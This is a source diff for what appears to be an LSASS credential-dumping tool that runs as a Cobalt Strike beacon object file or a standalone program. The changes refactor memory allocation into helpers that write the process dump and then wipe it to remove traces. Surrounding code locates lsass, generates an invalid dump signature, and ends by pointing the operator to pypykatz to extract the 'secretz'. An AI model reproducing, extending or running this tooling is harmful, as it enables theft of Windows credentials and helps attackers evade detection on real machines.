@@ -418,7 +418,7 @@ HANDLE get_process_handle(
         InitializeObjectAttributes(
             &CloneObjectAttributes,
             NULL,
-            0x00000040,
+            OBJ_CASE_INSENSITIVE,
             NULL,
             NULL
         );
@@ -462,7 +462,10 @@ ULONG32 convert_to_little_endian(
     ULONG32 number
 )
 {
-    return ((number & 0xff000000) >> 3*8) | ((number & 0x00ff0000) >> 8) | ((number & 0x0000ff00) << 8) | ((number & 0x000000ff) << 3*8);
+    return  ((number & 0xff000000) >> 0x18) |
+            ((number & 0x00ff0000) >> 0x08) |
+            ((number & 0x0000ff00) << 0x08) |
+            ((number & 0x000000ff) << 0x18);
 }
 
 void write_header(
@@ -1295,6 +1298,55 @@ HANDLE find_lsass(void)
     }
 }
 
+PVOID allocate_memory(SIZE_T* RegionSize)
+{
+    PVOID BaseAddress = NULL;
+    NTSTATUS status = NtAllocateVirtualMemory(
+        NtCurrentProcess(),
+        &BaseAddress,
+        0,
+        RegionSize,
+        MEM_COMMIT,
+        PAGE_READWRITE
+    );
+    if (!NT_SUCCESS(status))
+    {
+#ifdef BOF
+        BeaconPrintf(CALLBACK_ERROR,
+#else
+        printf(
+#endif
+            "Could not allocate enough memory to write the dump\n"
+        );
+        return NULL;
+    }
+    return BaseAddress;
+}
+
+void erase_dump_from_memory(PVOID BaseAddress, SIZE_T RegionSize)
+{
+    // delete all trace of the dump from memory
+    MSVCRT$memset(BaseAddress, 0, RegionSize);
+    // free the memory area where the dump was
+    NTSTATUS status = NtFreeVirtualMemory(
+        NtCurrentProcess(),
+        &BaseAddress,
+        &RegionSize,
+        MEM_RELEASE
+    );
+    if (!NT_SUCCESS(status))
+    {
+#ifdef BOF
+        BeaconPrintf(CALLBACK_ERROR,
+#else
+        printf(
+#endif
+            "Failed to call NtFreeVirtualMemory, status: 0x%lx\n",
+            status
+        );
+    }
+}
+
 void generate_invalid_sig(char* signature)
 {
     time_t t;
@@ -1402,23 +1454,11 @@ void go(char* args, int length)
         return;
 
     // allocate a chuck of memory to write the dump
-    void* BaseAddress = NULL;
     SIZE_T RegionSize = DUMP_MAX_SIZE;
-    NTSTATUS status = NtAllocateVirtualMemory(
-        NtCurrentProcess(),
-        &BaseAddress,
-        0,
-        &RegionSize,
-        MEM_COMMIT,
-        PAGE_READWRITE
-    );
-    if (!NT_SUCCESS(status))
+    PVOID BaseAddress = allocate_memory(&RegionSize);
+    if (!BaseAddress)
     {
         NtClose(hProcess); hProcess = NULL;
-        BeaconPrintf(
-            CALLBACK_ERROR,
-            "Could not allocate enough memory to write the dump"
-        );
         return;
     }
 
@@ -1453,23 +1493,7 @@ void go(char* args, int length)
         }
     }
 
-    // delete all trace of the dump from memory
-    MSVCRT$memset(BaseAddress, 0, dc.rva);
-    // free the memory area where the dump was
-    status = NtFreeVirtualMemory(
-        NtCurrentProcess(),
-        &BaseAddress,
-        &RegionSize,
-        MEM_RELEASE
-    );
-    if (!NT_SUCCESS(status))
-    {
-        BeaconPrintf(
-            CALLBACK_ERROR,
-            "Failed to call NtFreeVirtualMemory, status: 0x%lx",
-            status
-        );
-    }
+    erase_dump_from_memory(BaseAddress, RegionSize);
 
     // close the handle
     NtClose(hProcess); hProcess = NULL;
@@ -1615,22 +1639,11 @@ int main(int argc, char* argv[])
         return -1;
 
     // allocate a chuck of memory to write the dump
-    void* BaseAddress = NULL;
     SIZE_T RegionSize = DUMP_MAX_SIZE;
-    NTSTATUS status = NtAllocateVirtualMemory(
-        NtCurrentProcess(),
-        &BaseAddress,
-        0,
-        &RegionSize,
-        MEM_COMMIT,
-        PAGE_READWRITE
-    );
-    if (!NT_SUCCESS(status))
+    PVOID BaseAddress = allocate_memory(&RegionSize);
+    if (!BaseAddress)
     {
         NtClose(hProcess); hProcess = NULL;
-        printf(
-            "Could not allocate enough memory to write the dump"
-        );
         return -1;
     }
 
@@ -1654,22 +1667,7 @@ int main(int argc, char* argv[])
         );
     }
 
-    // delete all trace of the dump from memory
-    MSVCRT$memset(BaseAddress, 0, dc.rva);
-    // free the memory area where the dump was
-    status = NtFreeVirtualMemory(
-        NtCurrentProcess(),
-        &BaseAddress,
-        &RegionSize,
-        MEM_RELEASE
-    );
-    if (!NT_SUCCESS(status))
-    {
-        printf(
-            "Failed to call NtFreeVirtualMemory, status: 0x%lx\n",
-            status
-        );
-    }
+    erase_dump_from_memory(BaseAddress, RegionSize);
 
     // close the handle
     NtClose(hProcess); hProcess = NULL;
@@ -1687,8 +1685,12 @@ int main(int argc, char* argv[])
             "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s\n",
             &MSVCRT$strrchr(dump_name, '\\')[1]
         );
+        return 0;
     }
-    return 0;
+    else
+    {
+        return -1;
+    }
 }
 
 #endif
